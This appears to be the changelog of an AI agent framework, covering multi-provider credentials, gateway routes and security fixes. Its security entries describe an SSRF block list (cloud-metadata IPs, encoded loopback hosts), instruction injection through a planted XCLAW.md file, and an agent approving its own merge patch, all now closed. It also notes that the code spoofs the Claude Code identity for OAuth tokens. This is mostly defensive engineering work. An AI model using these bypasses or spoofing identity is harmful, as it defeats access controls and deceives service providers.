**Web UI** (control panel): a Channels card mirroring Providers — per-channel enable toggle, configured/running badges, per-field inputs (secrets = masked + Save/×, text/list/bool typed), per-channel hints, Restart button (live channel manager). `esc()` on every interpolation, operator token on every call, 401 → clear message.

**Gateway** `routes/channels.mjs`: `GET /channels/manage` (inventory + live `channelManager.status()` merge, no secrets), `POST /channels/manage/field|enabled|restart`. `/channels` is operator-token gated in both auth branches (channel secrets are bot tokens — writes must not be unauthenticated). The existing `/channels/status` keeps working.

Verified live: auth gate 401 without token; inventory returns 5 channels with zero secret values leaked; `/channels/status` 200; control UI serves; `xclaw channels` table renders. Suite 1304/0.

## 3.89.0 — polish the providers surface (CLI · TUI · web UI) for all providers

A consistency + clarity pass across every provider (now 12: xai, openai, anthropic, google, nvidia, openrouter, deepseek, groq, mistral, together, ollama, ollama-cloud).

**CLI `providers list`**
- Fixed column alignment — endpoints drop the scheme and elide to a fixed width, so wide URLs (google/nvidia/ollama-cloud) no longer break the table. Padding is computed on plain text so ANSI colors never skew columns.
- Grouped + sorted: active provider first, then other configured, then a dim "— not configured —" divider, then the rest dimmed — what's ready to use is on top.
- New MODELS column (per-provider model count); tidy uppercase header; footer shows `N/12 configured`.
- Cleaner credential line: `↳ oauth★  apikey` (dropped the redundant `<provider>:` prefix; kept ★preferred + expired).

**TUI** (setup wizard + use picker): reformatted section headers, spaced numbered menus, per-provider status shown inline; `ollama` gains a one-command **install** option in the wizard. Non-TTY guards + the paste-credential→live-models spine intact.

**Web UI (control panel)**: active/configured grouping mirrors the CLI; per-provider hints (ollama = local daemon/no key/install hint, ollama-cloud = needs ollama.com key, nvidia = public catalog); the key→models→Use spine finished (masked key input, "fetching live models…" state, live/built-in count tag, error fallback); credential badges (apikey/oauth/token, ★ preferred click-to-prefer, × remove); loading/empty/error/busy states; endpoint wraps in-cell (no page scroll). Security kept: `esc()` on every interpolation, operator token on every call, 401 → clear message.

Verified live: aligned CLI list across all 12 providers; gateway panel serves 12 providers, nvidia's 90 public models load without a key, auth gate 401, control UI 200. Suite 1285/0.

## 3.88.0 — add NVIDIA NIM provider (free model catalog)

NVIDIA offers a large catalog of models free through its OpenAI-compatible API (build.nvidia.com → `integrate.api.nvidia.com/v1`). Added as the `nvidia` provider — same per-provider credential model as the rest.

- **`nvidia`** — `https://integrate.api.nvidia.com/v1`, OpenAI-compatible, `NVIDIA_API_KEY` (an `nvapi-…` key from build.nvidia.com). Default model `meta/llama-3.3-70b-instruct`; 10 popular models seeded (Nemotron 70B/340B, DeepSeek R1, gpt-oss-120b, Qwen2.5 Coder, Mistral Large 2, Codestral, Phi 3.5 MoE).
- The catalog is **public** — `providers list` + live model discovery show all **90 chat models** even before a key is added; a key is only needed for inference. Add it with `xclaw providers set --provider nvidia --api-key nvapi-…`.

Verified: nvidia appears in `providers list`; live discovery returns 90 models from the public catalog. Suite 1285/0.

## 3.87.1 — split Ollama into two entries: `ollama` (local) + `ollama-cloud`

Follow-up to 3.87.0: instead of routing one `ollama` provider by whether a key is present, Ollama is now **two independent, always-visible provider entries** — cleaner and matching the per-credential model of the others.

- **`ollama`** — the local daemon, `http://127.0.0.1:11434/v1`, no key. Installed via `xclaw providers install ollama`.
- **`ollama-cloud`** — ollama.com, `https://ollama.com/v1`, uses an ollama.com API key (`ollama-cloud:apikey`). Add with `xclaw providers set --provider ollama-cloud --api-key <key>`.

Both appear separately in `providers list` and the UI, each independently selectable — no more implicit local/cloud switching on a single provider. The 3.87.0 key-based routing hack (registry `ollamaEffectiveDefault`, discovery + manage special-cases) is removed; each entry simply carries its own base URL. An existing `ollama:apikey` credential is migrated to `ollama-cloud:apikey`.

Verified live: `providers list` shows both entries with correct endpoints; `ollama-cloud` fetches 18 cloud models and runs `gpt-oss:120b` inference; the local daemon generates (llama3.2). Suite 1284/0.

## 3.87.0 — Ollama: one-command install + separate cloud API-key credential

Ollama now fits the same per-provider credential model as xAI/Anthropic — a local runtime you install in one command, plus a **separate cloud API key** that routes to ollama.com.

**One-command install** — `xclaw providers install ollama [--model M]` (`src/providers/ollama-install.mjs`): installs the runtime via the official script if missing, starts the daemon if down, pulls a default model (llama3.2), and reports readiness + local models. Every step idempotent and safe to re-run. Linux/macOS auto-install; Windows prints the download link.

**Cloud key as a second credential**: store an ollama.com API key with `xclaw providers set --provider ollama --api-key <key>` (profile `ollama:apikey`). The `ollama` provider now routes by credential — **local daemon (`127.0.0.1:11434`) when no key, ollama.com cloud (`https://ollama.com/v1`) when a key is present** — in both the agent loop (registry `ollamaEffectiveDefault`) and live model discovery. A user-set per-provider baseUrl still overrides both; `OLLAMA_CLOUD_BASE_URL` overrides the cloud host. `providers list` / the UI inventory show the endpoint requests actually go to.

Verified live: one-command install (runtime detected, daemon ensured, llama3.2 pulled); cloud key fetches **18 cloud models** and runs real inference (`gpt-oss:120b` → completion through xclaw's agent loop); local path unchanged (127.0.0.1). Suite 1284/0.

## 3.86.2 — fix cross-provider credential leak in model discovery (third site)

Found while verifying live-model discovery for all four configured credentials (xAI apikey+oauth, Anthropic apikey+oauth) through the web-UI panel: xAI's model-fetch returned HTTP 400 because `discovery.mjs`'s own `resolveApiKey` still used `cfg.agent.apiKey` (the ACTIVE provider's cached key — Anthropic's) for *any* provider. So `fetchLiveModels("xai")` sent the Anthropic key to `api.x.ai/models`.

`resolveApiKey` now applies the same provider-scoping guard shipped in 3.86.1 for `registry`/`profiles`: the cached `cfg.agent.apiKey` is used only when it belongs to the requested provider (or none is configured); `XCLAW_API_KEY` remains the explicit generic last-resort. Exported + regression-tested.

Verified live: all four credentials fetch their real model lists (xAI → 7 grok models via both apikey and the SuperGrok-seat oauth; Anthropic → 10 claude models via both oauth and the no-credit apikey — model listing needs no credit). Both the CLI (`xclaw providers list`) and the web-UI `/providers/manage/models` route serve them. Suite 1280/0.

## 3.86.1 — fix cross-provider credential leak (active provider's key sent to other providers)

Found while setting up a second provider (xAI) alongside Anthropic. With one provider's credential active, resolving a *different* provider returned the ACTIVE provider's token — so an agent run on xAI was sent your Anthropic OAuth token (and, because the token shape forced the Anthropic adapter, produced `Anthropic HTTP 404: model grok-*`). This is both a correctness bug and a credential-exposure bug (one vendor's token reaching another vendor's endpoint).

Three scoping fixes so each provider resolves ONLY its own credential:
- `resolveProviderRouteAsync`/`resolveProviderRoute`: `cfg.agent.apiKey` (the active provider's cached key) is used only when the resolved provider matches `agent.provider` (or none is set) — same guard already applied to `baseUrl` in 3.85.2.
- `resolveProviderToken` step 1: dropped the legacy `|| p === "xai"` default-to-xai clause that handed `cfg.agent.apiKey` to xai regardless of ownership; now returns it only for the matching provider.
- `resolveProviderToken` step 2: honors `opts.profileId` (which `loadConfig` fills with the active provider's `authProfileId`) only when that profile's provider matches the requested one.
- `createProvider`: the `sk-ant-oat` token-shape auto-detect no longer forces the Anthropic adapter when the provider is an explicit non-Anthropic one.

Verified live: `xai:apikey` resolves the xAI key and runs grok-4.5 inference (real reply, cost-tracked); `anthropic` keeps its own OAuth token; no regression. Regression test added. Suite 1279/0.

## 3.86.0 — multi-provider management: per-provider key + OAuth + base URL, CLI wizard, TUI, web UI

Configure every provider independently — its own API key, its own OAuth, its own base URL, all separate and switchable — and pick a model from the provider's LIVE model list after entering the credential.

**Credential-first live model discovery.** After a key or OAuth token is stored for a provider, xclaw fetches that provider's real `/models` list using the credential and presents it for selection — no more guessing from a static list. Anthropic OAuth (`sk-ant-oat`) discovery fixed to use the Bearer + oauth-beta headers (the `x-api-key` path 401s for OAuth); API keys (`sk-ant-api`) still use `x-api-key`.

**Separate credentials per provider.** API key and OAuth for the same provider are stored as distinct profiles (`<provider>:apikey` vs `<provider>:oauth`) so they coexist — keep both, switch which one resolves via auth-order. A stored key never clobbers an OAuth token.

**CLI — `xclaw providers`** (`src/cli/providers-cli.mjs`):
- `providers list` — table of every provider: endpoint (custom/default), key/oauth status, active model, per-credential badges.
- `providers set --provider X [--base-url U] [--api-key K] [--reset-url]` — non-interactive.
- `providers oauth --provider X` — provider-dispatched OAuth login (Anthropic/xAI/OpenAI PKCE flows).
- `providers use [X] [model]` — direct, or a zero-dep readline TUI (provider → credential → live-model menus).
- `providers setup` — sequential wizard walking every provider (skip / API key / OAuth / base URL / reset), then the active pick.

**Web UI + gateway** (`routes/providers.mjs`, `ui/control` Providers panel): `GET /providers/manage` inventory (no secrets), `POST base-url` / `key` / `models` / `use` / `check` / `prefer`, `DELETE key`. The panel implements the same spine: paste key → dropdown fills with live models → pick → Use; editable base URL, per-credential badges, active highlight.

**Security** (all verified live):
- `/providers/manage/*` is operator-token gated in both auth branches — a base-URL rewrite (which redirects the stored Bearer token) can't be done unauthenticated. No token / wrong token → 401.
- Base-URL writes are validated: `https://` any host, `http://` loopback only; `file:`, non-loopback `http:`, other schemes → 400.
- Control-UI panel escapes every interpolated value (provider names, ids, URLs, model ids) against stored XSS.

Shared core `src/providers/manage.mjs` (inventory / setBaseUrl / setActive / checkCredential) backs both transports; `saveConfigPatch` in config/load.mjs is the shared atomic deep-merge writer. Suite 1279/0.

## 3.85.2 — install-hardening: doctor cwd-independence, provider baseUrl scoping, env precedence

Found while installing the CLI locally (`npm run install:local` + `npm link`) and driving a real end-to-end agent turn.

- **Doctor false errors from any cwd**: the Phase-A bridge-file checks resolved repo paths against `cwd`/`XCLAW_ROOT`, so the installed `xclaw doctor` reported 6 spurious errors when run outside the repo (the very next check resolved the same files correctly via module path). Now anchored on the package root; passes from any directory.
- **Provider baseUrl mis-scoping**: `agent.baseUrl`/`apiBase` (which `loadConfig` derives from the configured provider) were applied even when a *different* provider was selected via `XCLAW_PROVIDER` — so `XCLAW_PROVIDER=ollama` with `agent.provider=xai` aimed the ollama request at `api.x.ai` and failed. They now apply only when the resolved provider matches `agent.provider` (or none is configured).
- **Env-over-config precedence**: `XCLAW_MODEL`/`XCLAW_PROVIDER` now beat file config in the route resolver and model-chain builder (matching the existing `XCLAW_SSRF`/`XCLAW_GATEWAY_HOST` convention) — a session override no longer loses to a baked config value.
- **Test hermeticity**: the R11 credential-scoping tests now isolate the auth-profile store to a temp dir, so a real stored OAuth token on the dev machine can't leak into the env-fallback assertions.

Behavior unchanged when provider/model aren't overridden. Suite 1255/0.

## 3.85.1 — split the catch-all routes/api.mjs into per-plane modules

The broadest module from the 3.85.0 router split carried five unrelated planes in one file. Now: `routes/sessions.mjs` (sessions + transcripts + checkpoints), `routes/subagents.mjs`, `routes/mcp.mjs`, `routes/media.mjs`, with the three one-off context reads (`/skills`, `/memory`, `/providers/route`) joining the misc reads in `routes/ops.mjs`. Behavior byte-identical — pure mechanical move. Suite 1255/0; all groups + /v1 aliases live-smoked 200.

## 3.85.0 — router split complete, Anthropic thinking-block replay

Suite 1252 total / 0 fail (1247 pass, 5 env-skipped). Live gateway smoke across all extracted groups + /v1 aliases green.

**Gateway router split finished** (design review 4.3)

- Six more route modules extracted — `routes/jwks.mjs`, `routes/alerts.mjs`, `routes/ops.mjs`, `routes/eval-queue.mjs`, `routes/tokens.mjs`, `routes/api.mjs` — joining security/swarm/cron. `index.mjs`: **2380 → 1564 lines**. Deliberately still inline: the three SSE stream handlers, the webchat static/OAuth block, the Telegram webhook, WS attach, and error handling — closures over writer/channel state, not route logic.
- **Real pre-existing bug fixed during extraction**: the inline `POST /queue` handler contained pasted gateway-startup code that registered a NEW approval-digest `setInterval` on every enqueue request (unbounded interval leak) plus redundant slo-monitor starts. The extracted handler keeps only the idempotent worker ensure-call.

**Anthropic multi-turn thinking-block replay** (closes the 3.83.0 known limitation)

- With extended thinking + tool use, the API requires prior-turn thinking blocks (with signatures) replayed in assistant history. The stream parser now captures `thinkingBlocks` verbatim — including the previously discarded `signature_delta` and `redacted_thinking` blocks — and `toAnthropicMessages` re-emits them first in assistant content when thinking is enabled for the request (omitted otherwise, as the API demands). Zero `loop.mjs` changes needed: the provider message object flows into history by reference, and eviction's shallow spread preserves the field (both proven by tests). End-to-end two-call mock proves the exact signature round-trips to the second request's wire body.
- Scope note: durable-transcript resume across process restarts reconstructs only role/content (it never restored `tool_calls` either), so cross-restart mid-tool-cycle resume doesn't exist as a flow — the in-process cycles the API requires are fully covered.

## 3.84.0 — final deferred tier: WS protocol hardening, resume journal, skills integrity, router split

Suite 1235 total / 0 fail (1230 pass, 5 env-skipped). Extracted routes + /v1 live-verified on a booted gateway.

**WebSocket protocol hardening (zero-dep — no library added)**

- The hand-rolled RFC6455 layer had real holes: NO payload cap anywhere (a client claiming a 10GB frame via the 64-bit length header would be buffered), the FIN bit was ignored entirely (fragmented messages were silently corrupted, first fragment parsed as the whole message), no client-mask enforcement, close frames never echoed the peer's code. New exported `createFrameParser`: stateful partial-chunk/multi-frame parsing, 64-bit lengths rejected on the header alone (1009 before any buffering, 1MB default cap matching the HTTP body cap), client mask required (1002), full fragmentation state machine with interleaved control frames, control-frame rules enforced, close-code validation + proper close handshake with grace, strict UTF-8 (1007), unknown opcodes/RSV → 1002. Garbage bytes can only produce a clean close, never a crash. Public API and auth-before-101 unchanged.

**Swarm resume journal**

- Per-run append-only NDJSON (`~/.xclaw/swarms/runs/<id>.journal`): `run_start` header with a graph hash, `node_start`/`node_result` at every transition. New `resumeSwarmRun(cfg, runId)` + `xclaw swarm resume <id>`: replays last-terminal-ok results, re-runs failed/skipped nodes, refuses on graph-hash mismatch (`JOURNAL_GRAPH_MISMATCH`), tolerates torn trailing lines. Journaling is advisory — a write error warns, never fails the run. The wave scheduler is reused via preloaded state, not duplicated.

**Skills integrity manifest (signed-skills lite, no external trust infra)**

- `xclaw skills lock` pins every discovered skill's SKILL.md sha256 into a versionable `skills.lock.json` at the workspace git root; `xclaw skills verify` reports ok/changed/new/missing (exit 1 on drift). Loader enforcement via `skills.integrity`: no lockfile → off (zero behavior change); lockfile present → warn; lockfile + prod → **enforce** (changed/unmanifested skills excluded from injection AND from the `xclaw_skill` tool). Doctor row `skills.integrity`.

**Gateway router split (started) + stale-finding closure**

- `/swarm` read/merge routes and `/cron` scheduler routes extracted into `routes/swarm.mjs` / `routes/cron.mjs` (the routes/security.mjs pattern); index.mjs shrinks 2451→2380 lines with the SSE-heavy handlers deliberately left inline. Remaining groups tracked.
- Stale audit findings closed by inspection: sessions persistence already writes atomically (tmp+rename), and the flagged `seats/manager.mjs` no longer exists in the tree.

Remaining (explicitly parked): full router split to ~400 lines, Anthropic multi-turn thinking-block replay (loop.mjs history plumbing), bundle git-history purge (destructive — needs explicit owner opt-in).

## 3.83.0 — deferred P2/P3 tier: progressive skills, reasoning params, swarm scale, /v1 API

Suite 1213 total / 0 fail (1208 pass, 5 env-skipped) — and ~4s faster from an approval-timer fix. Gateway /v1 aliasing live-verified.

**Skills progressive disclosure**

- The system prompt now carries a compact skill INDEX (name, description, trigger hints) instead of full bodies truncated mid-sentence; only skills that fit whole within `skills.inlineMaxChars` (default 1500) are inlined — nothing is ever cut mid-body. New read-only `xclaw_skill` tool loads any full skill on demand (list variant without a name). `skills.progressive: false` restores the legacy behavior.

**Provider sampling + reasoning**

- `agent.temperature` config (default stays 0.2; `null` omits the field — required by reasoning models). `agent.reasoning = {enabled, effort, maxTokens}` → `reasoning_effort` on OpenAI-compat paths, `thinking: {type:"enabled", budget_tokens}` on Anthropic (temperature auto-omitted; `max_tokens` auto-grown past the budget as the API requires). Stream parser tolerates `thinking_delta`/`signature_delta`; thinking accumulates into `message.reasoning`, never into text. Zero wire change when unset.

**Swarm scale**

- Handoff truncation limits are config (`swarm.upstreamMaxChars`/`resultMaxChars`), defaults raised 1800→6000 / 1500→4000, and every actual cut is marked visibly (`…[truncated N chars — raise swarm.upstreamMaxChars]`) instead of silent loss. Node/parallelism caps are config (`swarm.maxNodes`/`maxParallel`, ceilings 50/16, legacy `maxChildrenPerRun` honored). New spawn depth guard: children carry `_spawnDepth` through their cfg; spawn/swarm refuse beyond `swarm.maxSpawnDepth` (default 2) with structured `SPAWN_DEPTH_EXCEEDED`.

**Security + API plane**

- **SLA auto-approve now revalidates the frozen plan** exactly like a human decide — an environment that drifted while the request sat pending is denied with `plan_drift` (closes brief 1.2's remaining shape).
- **Real bug fixed**: pending-approval timeout timers were never cleared on resolution — any process using the gate stayed alive up to 120s after the approval settled. Timers are tracked and cleared on every resolution path (this is where the suite's ~4s speedup came from).
- `EXEC_TOOLS` is single-sourced from `system-run-plan.mjs`; approvals' `requireApproval`/`execTools` defaults derive from it (previously triplicated string sets that had already drifted).
- **`/v1` API versioning**: every gateway route is now reachable under `/v1/...` (marked with `X-XClaw-Api-Version: 1`) so clients can pin a version prefix before any breaking v2 surface exists.

**SCAFFOLD sweep (Phase 8 start)**

- The repo's named heuristics now carry `// SCAFFOLD:` markers stating what replaces them: `inferGoal`, `detectTurnClosure`, `collectArtifacts`, `isKnownPollToolCall`, `VERIFY_OK/REVISE` sentinels, `NON_CHAT_RE` model classification, tokenizer curve-fitting — and the Anthropic OAuth **Claude Code identity spoof**, which additionally gets a doctor WARN (`security.oauthIdentity`) whenever an `sk-ant-oat` token is in use.

Still deferred with rationale: WS library (violates the zero-dependency stance — hand-rolled RFC6455 stays), signed skills/manifest-first activation (needs a trust-model decision), gateway router file split (mechanical, low value vs. churn), swarm resume journal (design sketched in-session), sessions/seats durability.

## 3.82.0 — P2 tier: structured critic verdicts, prompt caching on the wire, gateway hygiene

Suite 1182 total / 0 fail (1177 pass, 5 env-skipped). Gateway boot + new routes + CORS live-verified.

**Bitter-lesson fixes**

- **Critic merge-gate is structured**: critics now end with an authoritative JSON verdict line (`{"verdict":"approve"|"block","confidence":0..1,"reasons":[...]}`); `parseCriticVerdict` (string-aware balanced-brace scanner, last-verdict-wins, fenced/bare/embedded) decides the gate. The keyword regex survives ONLY as a fallback for critics that emit no parseable verdict — "I would not reject this" no longer blocks a merge. Reasons mark which path decided.
- **Anthropic prompt caching finally reaches the wire**: `toAnthropicMessages` was JSON.stringify-ing structured system content into a text blob, destroying the loop's `cache_control` breakpoints. Now structured system content maps to native Anthropic text blocks with `cache_control` preserved (capped at the API's 4-breakpoint limit, keeping the last 4); plain-string system gets one trailing breakpoint by default. Opt-outs: `tokens.cacheBreakpoints.enabled:false` or mode `none`. OAuth attestation block stays first; shared `applySystem` dedupes chat/chatStream.

**Gateway hygiene**

- **CORS wildcard removed**: `Access-Control-Allow-Origin: *` was on every response — any web page could read loopback gateway responses on tokenless lab setups. Default now: no Origin → no header; loopback origins reflected; everything else blocked. Operator override `gateway.corsOrigin` (`"*"`, origin string, or list).
- **`/security/*` served by the routes module** (was an unwired extracted file + three stale inline duplicates): richer payloads — pending list with SLA stats, `allow-always`-style decision parsing, policy with approval-gate info + computer-engine snapshot.
- Preflight allows `Authorization`/`x-xclaw-token` headers.

**Sweeper pass**

- **Deleted** `src/computer/browser-service.mjs` — zombie module referencing undefined identifiers (could never run); every runtime pointer/doc updated; the CDP path is the bundle engine. Recovery via git history.
- **Deleted** `src/agent/secure-tool-call.mjs` + `src/security/policy-matrix.mjs` (+tests) — imported by nothing but their own tests; the live logic runs inline in the loop/approval gate.
- **Wired `cfg.providers.routes`** (documented config that was consumed by nothing): config prefix routes now win over the built-in table; `routes.default` beats the hardcoded fallback but never an explicit `agent.provider`.

**Skills + eval honesty**

- Skill roots are config-driven (`skills.roots`, highest precedence); legacy Grok-sandbox absolute paths are on-disk-gated fallbacks instead of hardcoded entries.
- Eval scorer gains normalized any-of matching (`fileContainsAny`/`replyContainsAny`, whitespace-insensitive); brittle literal expectations in `hard.json` converted — correct-but-reformatted answers pass, wrong answers still fail.

Deferred (tracked): gateway router split + `/v1` versioning, hand-rolled WS → library, skills progressive disclosure, swarm handoff truncation/caps, SCAFFOLD sweep (Phase 8), signed skills.

## 3.81.0 — P0/P1 close-out: browser SSRF, merge self-approve, correctness batch

Closes the remaining P0/P1 tier of the 2026-08-12 design review + Grok brief. Suite 1149/0 fail (1144 pass, 5 env-skipped; was 1107), live LLM→MCP loop verified end-to-end for the first time.

**Security (P0)**

- **Native `browser_tab` SSRF guard**: `fetchUrl` did raw `http/https.request` on any agent URL with blind redirect-follow — the 3.79.x guard was only wired to `web_fetch`. Now routed through `safeFetch` (scheme allowlist, DNS-validate + IP-pin every hop, private/loopback blocked by default, `XCLAW_SSRF_ALLOW_PRIVATE=1` lab bypass) plus a new **metadata floor**: cloud-metadata endpoints (169.254/16, `metadata.google.internal`, Alibaba 100.100.100.200, AWS IPv6) are blocked in EVERY mode, including `off`/`allowPrivate`. Manager forwards the SSRF policy env to the computer child; blocked navigations return structured `{ok:false, code:"SSRF_BLOCKED"}`.
- **Swarm merge self-approval closed**: `xclaw_swarm_merge_approve` was model-callable with no principal check — the agent that proposed a patch could approve it next turn, even in prod. `approveMergeProposal` now takes `opts.principal`; CLI/gateway stay operator surfaces, the in-loop tool passes `agent` and is refused with `PRINCIPAL_DENIED` (lab-only override `swarm.allowAgentMergeApprove`, never honored in prod).

**Correctness + hardening (P1)**

- **Worktree merges**: `worktreeDiff` diffs from the merge-base with the main repo, so **committed** subagent work finally surfaces instead of silently NOOPing (`committedCount`/`base` fields; `dirty` includes committed-only). `checkOnly` is now a pure dry-run (the unguarded `fs.cp` and pre-return `fs.mkdir` are gone). Real latent bug fixed: patches were written `trim()`med, stripping the trailing newline `git apply` requires — tracked-diff merges ending in an addition failed `PATCH_CORRUPT`.
- **Cron**: full 5-field matching (dom/month/dow, lists, ranges, steps, Vixie dom/dow OR-rule) — `0 0 * * 1` no longer fires daily. Durable job store (`~/.xclaw/cron-jobs.json`, atomic writes); `start()` restores + re-arms payload jobs after gateway restart.
- **Providers**: credential fallback is provider-scoped — a missing key no longer ships another vendor's env credential to an arbitrary baseUrl (`XCLAW_API_KEY` stays as the explicit generic override). Failover router gains half-open recovery (`cooldownMs`, default 60s) instead of staying demoted forever.
- **Gateway**: constant-time token comparison (HTTP + WS); request bodies capped at 1MB (413).
- **Memory trust boundary**: the `XCLAW.md`/`AGENTS.md` upward walk stops at the workspace git root (never the filesystem root) — a planted `/tmp/XCLAW.md` can no longer inject instructions.
- **`runAgentOnce` fixed**: passed a `messages` array the loop silently drops → every automations one-shot ran with `content:undefined` (Provider HTTP 400). Found during live verification; source-assertion tripwire added.
- **CI honesty**: removed the `|| true` softening on the OAuth/vault pack in eval-regression.

**Docker (recovered from `fix/docker-onboard` branch)**

- Env bind overrides (`XCLAW_GATEWAY_HOST/PORT`, `XCLAW_COMPUTER_HOST/PORT`, token via env) so compose-published ports work; Docker try-me path documented in INSTALL/README. Composes with bind-guard: non-loopback binds still require a token.

**Verified live**: real LLM (ollama `glm-5.2:cloud`) through the actual agent loop discovered the stdio MCP fixture, called `mcp__echo__echo("XCLAW-LIVE-42")`, and reported its response — the review's last UNVERIFIED item. Branch board cleaned: 10 superseded remote branches deleted after per-branch supersession checks.

## 3.80.2 — restore install/onboard npm shortcuts + bundle-safe marker check

- Restored the `npm run install:local` / `onboard` / `init` / `prove:install` script aliases that were dropped from package.json in the 3.76.0 release commit (the underlying `install/install.sh`, `src/cli/init.mjs`, and `scripts/prove-install-e2e.mjs` were always present and `install-e2e` CI stayed green — only the ergonomic shortcuts were missing).
- `check-bundle-markers` now SKIPs cleanly when the opt-in bundle isn't installed instead of hard-failing on the (now release-fetched) `xclaw-server.mjs`.
- README quickstart documents the one-command path: `XAI_API_KEY=… npm run install:local` (or `npm run onboard -- --yes --profile lab`).
- Verified live: `npm run onboard` → exit 0, `~/.xclaw/xclaw.json` created; `npm run install:local` → exit 0; one-command install-e2e proof green in CI on a clean bundle-less checkout.

## 3.80.1 — atomic bundle publish helper (closes the manifest-drift footgun)

- `npm run publish:bundle [path]` (`scripts/publish-bundle.mjs`) updates the release asset and the `bundle-artifact.json` manifest in one step, so the pinned sha256 can't drift from what `fetch:bundle` downloads. It hashes the bundle, `gh release upload --clobber`s it, **re-downloads and verifies the checksum round-trips**, and only then rewrites the manifest — if the upload or verify fails, the manifest is left untouched. Auto-derives the repo from the manifest URL; `--dry-run` previews.
- Tests: dry-run hashes + derives repo without uploading; missing-bundle error; round-trip/no-op guards present; a canary asserting the committed manifest sha stays canonical. Verified live end-to-end: published an altered bundle (manifest → new sha), then republished the original (manifest restored), `fetch:bundle` re-verifies.

## 3.80.0 — 16MB CDP bundle moved out of git into a release artifact

- `src/computer/xclaw-server.mjs` (16.8MB, ~64% of repo size) is no longer tracked in git. It is published as the `computer-bundle` GitHub release asset and git-ignored. Only `XCLAW_COMPUTER_ENGINE=bundle` (opt-in full CDP) needs it; the default native/generated engines don't.
- `npm run fetch:bundle` (`scripts/fetch-computer-bundle.mjs`) downloads it on demand, **sha256-verified** against the committed manifest `src/computer/bundle-artifact.json`; prefers `gh release download` (API-backed, private-repo friendly), falls back to the direct release URL; idempotent (skips when present + valid).
- Starting with `engine=bundle` and no local copy auto-fetches (disable with `XCLAW_BUNDLE_AUTOFETCH=0`); otherwise a clear "run npm run fetch:bundle" error.
- `build:computer` and `doctor` are now tolerant of the absent bundle (doctor `a.bundle` is informational unless the engine actually needs it); build stamp records `legacyBundlePresent`.
- Tests: bundle-artifact manifest shape + sha256, the file is untracked in git (tripwire against re-adding it), build never creates the bundle whether present or absent. Verified end-to-end: build with bundle absent → OK; `fetch:bundle` → downloads 16839070B with matching sha256; re-run → idempotent skip.
- NOTE: git *history* still contains the blob (a history rewrite is a separate, destructive op blocked by branch protection). This stops the repo carrying it forward and makes fresh shallow clones lean.

## 3.79.1 — SSRF: pin the connection to the validated IP (close DNS-rebind)

- `safeFetch` previously validated via DNS, then handed the URL to `fetch`, which resolved DNS **again** — a rebind between the two lookups could still send the socket to a private target. Now each hop connects through `requestPinned` (`node:http`/`node:https` with a `lookup` override) that forces the socket to the exact IP that passed validation, while the URL keeps its real hostname so Host header, TLS SNI, and cert validation are unchanged. Zero new dependencies.
- `assertUrlAllowed` now returns `pinIp` (the validated address; null when the guard is bypassed via off/allowPrivate/allowHosts, where the caller falls back to normal resolution).
- `requestPinned` handles redirects at the `safeFetch` layer (re-validated per hop), sets `Accept-Encoding: identity`, and decodes gzip/deflate/br responses (node:http does not auto-decompress).
- Tests: pinning proven deterministically — a request to `example.com` pinned to `127.0.0.1` reaches the local server (DNS bypassed at connect), Host header preserved; `pinIp` presence/absence asserted. Live-verified: `web_fetch https://example.com` → 200 through the pinned path; metadata still blocked.

## 3.79.0 — SSRF guard + WebSocket upgrade auth

- **SSRF guard** (`src/security/ssrf.mjs`) on `web_fetch` — the agent-controlled server-side fetch was the review's open SSRF vector. Now: http/https only; DNS-resolve the host and block if ANY address is loopback/private/link-local/ULA/CGNAT/**cloud-metadata (169.254.169.254)** (getaddrinfo canonicalizes decimal/hex host encodings, so `http://2130706433/` → 127.0.0.1 is caught); **redirects followed manually and re-validated per hop** (a public host 302-ing to metadata is blocked). Config `security.ssrf`: `mode` block|off, `allowPrivate` (lab dev), `allowHosts`, `maxRedirects`; `XCLAW_SSRF` env.
- **WebSocket upgrade auth** (`src/gateway/ws-hub.mjs` + `auth.mjs`): the `/ws/events` upgrade previously wrote `101` with zero auth. Now an `authorize` gate runs BEFORE the handshake — rejects with `401` whenever a token is set or `requireAuth`/prod. Token accepted via `?token=`, `x-xclaw-token`, or `Sec-WebSocket-Protocol: xclaw.token.<token>` (the browser-settable carrier, echoed back on accept). Control UI passes an operator token from `localStorage.xclaw_token`.
- Doctor: `security.ssrf` + `security.wsAuth` checks.
- Tests: SSRF IP classifier (v4/v6/mapped/metadata/garbage), URL/scheme/decimal-encoding blocks, **live redirect-hop-into-metadata block**; WS handshake auth over a real socket (open when tokenless, 401 on missing/wrong token, 101 via query/header/subprotocol, fail-closed on requireAuth-without-token). 18 new tests.

## 3.78.0 — Tool planes + bundled skills (Grok) · MCP-in-loop regression fix (Claude)

- **Tool planes T0–T4** (Grok): plane map + ToolCall contract (`src/tools/planes.mjs`), Tool Router single dispatch path (`src/tools/router.mjs`), `runToolBatches` plane concurrency with maxParallel + abort, computer-only plane for bash/files/browser (heavy tools never run in-process), allowlisted `web_search` plane (Brave/DDG, HTTP only — never shell).
- **Bundled skills** (Grok): docx/pptx/xlsx office, pdf (create/transform/forms/OCR), ffmpeg, ImageMagick, skill-creator/installer, memory-edit, color, finance, image-gen-edit (`skills/bundled/`, 4.6MB).
- **Automations** (Grok): schedule prompts + list/pause/run/results + tasks skill.
- **FIX — MCP regression**: the T1 router refactor dropped 3.77.0's MCP loop integration (no `createAgentMcpTools` discovery, no dispatch, no close — `mcp__*` calls would throw "No MCP adapter"). Restored via the router's own `agentHandlers` plane: discovery feeds tool defs, per-tool handlers dispatch to the MCP client, stdio children closed in `finally`. New router-level end-to-end test so this cannot silently regress again.
- Hygiene: session reports (`MILESTONE-2026-08-12`, `PROCESS_GATEWAY_FAILURE`, `SHELL_STATUS`) moved from repo root to `docs/reports/`.

## 3.77.0 — MCP reaches the agent loop

- **Agent-loop MCP** (closes the review's worst gap — memory/MCP 3/10): tools from `mcp.servers` are discovered at loop start and join the tool list as `mcp__<server>__<tool>`, dispatched through the SAME sandbox/egress/approval path as built-in tools. New `src/agent/mcp-tools.mjs` adapter; stdio clients closed in the loop's `finally`.
- **stdio transport** (`src/mcp/stdio-client.mjs`): spawn `command`+`args`, newline-delimited JSON-RPC out, accepts newline AND Content-Length frames in (interops with spec servers and our own stdio server); request correlation, per-request timeouts, fail-all on child exit.
- **Client manager rework** (`src/mcp/client.mjs`): per-server transports (http/stdio), MCP `initialize` handshake (tolerates minimal servers), `tools/list` cache with TTL + `refresh`, `status()`, `close()`; namespaced + provider-safe tool names.
- **Fail-open discovery**: a dead/misconfigured server emits an `mcp` event and contributes zero tools — the run never dies because of MCP.
- Gateway: `GET /mcp/status`, `GET /mcp/tools?refresh=1`. Doctor: `mcp` check. XCLAW.md section.
